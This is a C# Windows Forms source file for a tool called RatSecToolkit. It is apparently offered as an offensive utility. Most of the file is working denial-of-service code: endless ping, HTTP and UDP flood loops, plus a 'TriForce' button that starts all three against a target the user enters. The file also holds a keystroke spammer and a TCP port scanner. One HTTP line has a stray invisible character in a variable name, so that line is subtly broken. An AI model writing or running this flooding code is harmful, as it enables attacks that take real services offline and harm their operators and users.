using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Net;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace RatSecToolkit
{
    public partial class RatSecToolkit : Form
    {
        public RatSecToolkit()
        {
            InitializeComponent();
            logText.Text = "Welcome to RatSecToolkit\r\n";
            macBox.Text = CheckOS.macId();
        }

        public BackgroundWorker worker1 = new BackgroundWorker { WorkerReportsProgress = true };
        public BackgroundWorker worker2 = new BackgroundWorker { WorkerReportsProgress = true };
        public BackgroundWorker worker3 = new BackgroundWorker { WorkerReportsProgress = true };

        private void spoofIP_Click(object sender, EventArgs e)
        {
            IEnumerable<string> enumerator = CheckOS.GetNicIds();
            foreach (string i in enumerator)
            {
                Debug.Print(i);
            }
        }

        private void getMac_Click(object sender, EventArgs e)
        {
            macBox.Text = CheckOS.macId();
        }

        private void spamBtn_Click(object sender, EventArgs e)
        {
            if (spamBtn.Text == "Spam")
            {
                spamTimer.Start();
                spamBtn.Text = "Stop";
            }
            else
            {
                spamTimer.Stop();
                spamBtn.Text = "Spam";
            }
            Debug.Print("clicked");
        }

        private void spamTimer_Tick(object sender, EventArgs e)
        {
            SendKeys.Send(spamText.Text);
            SendKeys.Send("{ENTER}");
        }

        private void frequencyText_TextChanged(object sender, EventArgs e)
        {
            spamTimer.Interval = int.Parse(frequencyText.Text);
        }

        DoWorkEventHandler doWork1 = (sender, e) =>
        {
            string value = (string)e.Argument;
            var worker = (BackgroundWorker)sender;
            worker.ReportProgress(1, "PING DOSing" + value);
            while (true)
            {
                Ping p = new Ping();
                try { p.Send(value, 3000); }
                catch { }
            }
        };
        DoWorkEventHandler doWork2 = (sender, e) =>
        {
            string sw2 = (string)e.Argument;
            var worker = (BackgroundWorker)sender;
            worker.ReportProgress(1, "HTTP DOSing..." + sw2);
            sw2 = "http://" + sw2;
            while (true)
            {
                HttpWebRequest request = (HttpWebRequest)HttpWebRequest.Create(sw­2);
                HttpWebRequest request1 = (HttpWebRequest)HttpWebRequest.Create(sw­2);
                HttpWebRequest request2 = (HttpWebRequest)HttpWebRequest.Create(sw­2);
                HttpWebRequest request3 = (HttpWebRequest)HttpWebRequest.Create(sw­2);
                HttpWebRequest request4 = (HttpWebRequest)HttpWebRequest.Create(sw­2);
                HttpWebRequest request5 = (HttpWebRequest)HttpWebRequest.Create(sw­2);
                HttpWebRequest request6 = (HttpWebRequest)HttpWebRequest.Create(sw­2);
            }
        };
        DoWorkEventHandler doWork3 = (sender, e) =>
        {
            string value = (string)e.Argument;
            var worker = (BackgroundWorker)sender;
            worker.ReportProgress(1, "UDP DOSing" + value);
            UdpClient udp = new UdpClient();
            ASCIIEncoding text = new ASCIIEncoding();
            byte[] stringattack = text.GetBytes("FDSifejrfijre432423KDFSfds0289;',r824#$");
            string url = value;
            int port = 80;
            while (true)
            {
                udp = new UdpClient();
                udp.Connect(url, port);
                udp.Send(stringattack, stringattack.Length - 1);
            }
        };
        // This event handler updates the progress.
        private void pingBtn_Click(object sender, EventArgs e)
        {
            string value = ipBox.Text;
            if (worker1.IsBusy != true)
            {
                worker1.DoWork += doWork1;
                worker1.ProgressChanged += (sendernt, ent) =>
                {
                    logText.AppendText(ent.UserState.ToString() + "\r\n");
                };
                worker1.RunWorkerAsync(value);
            }
        }

        private void httpBtn_Click(object sender, EventArgs e)
        {
            string value = ipBox.Text + ":" + portBox.Text;
            if (worker2.IsBusy != true)
            {
                worker2.DoWork += doWork2;
                worker2.ProgressChanged += (sendernt, ent) =>
                {
                    logText.AppendText(ent.UserState.ToString() + "\r\n");
                };
                worker2.RunWorkerAsync(value);
            }
        }

        private void udpBtn_Click(object sender, EventArgs e)
        {
            string value = ipBox.Text;
            if (worker3.IsBusy != true)
            {
                worker3.DoWork += doWork3;
                worker3.ProgressChanged += (sendernt, ent) =>
                {
                    logText.AppendText(ent.UserState.ToString() + "\r\n");
                };
                worker3.RunWorkerAsync(value);
            }
        }

        private void TriForce_Click(object sender, EventArgs e)
        {
            string value = ipBox.Text;
            if (worker1.IsBusy != true)
            {
                worker1.DoWork += doWork1;
                worker1.ProgressChanged += (sendernt, ent) =>
                {
                    logText.AppendText(ent.UserState.ToString() + "\r\n");
                };
                worker1.RunWorkerAsync(value);
            }
            value = ipBox.Text + ":" + portBox.Text;
            if (worker2.IsBusy != true)
            {
                worker2.DoWork += doWork2;
                worker2.ProgressChanged += (sendernt, ent) =>
                {
                    logText.AppendText(ent.UserState.ToString() + "\r\n");
                };
                worker2.RunWorkerAsync(value);
            }
            value = ipBox.Text;
            if (worker3.IsBusy != true)
            {
                worker3.DoWork += doWork3;
                worker3.ProgressChanged += (sendernt, ent) =>
                {
                    logText.AppendText(ent.UserState.ToString() + "\r\n");
                };
                worker3.RunWorkerAsync(value);
            }
        }

        private void button4_Click(object sender, EventArgs e)
        {
            int startport = Int32.Parse(startPort.Text);
            int endport = Int32.Parse(endPort.Text);
            for (int port = startport; port < endport; port++)
            {
                ScanPort(port);
            }
        }
        private void ScanPort(int port)
        {
            string host = ipBox.Text;
            using (var tcp = new TcpClient())
            {
                var ar = tcp.BeginConnect(host, port, null, null);
                using (ar.AsyncWaitHandle)
                {
                    //Wait 2 seconds for connection.
                    if (ar.AsyncWaitHandle.WaitOne(2000, false))
                    {
                        try
                        {
                            tcp.EndConnect(ar);
                            logText.AppendText("IP: "+ host + " Port:" + port + "  <<<<CONNECTED!!!\r\n");
                        }
                        catch
                        {
                            logText.AppendText("IP: "+ host + " Port:" + port + "  Refused Connection\r\n");
                        }
                    }
                    else
                    {
                        logText.AppendText("IP: "+host+ " Port:" + port + "   Timed Out\r\n");
                    }
                }
            }
        }
    }
}
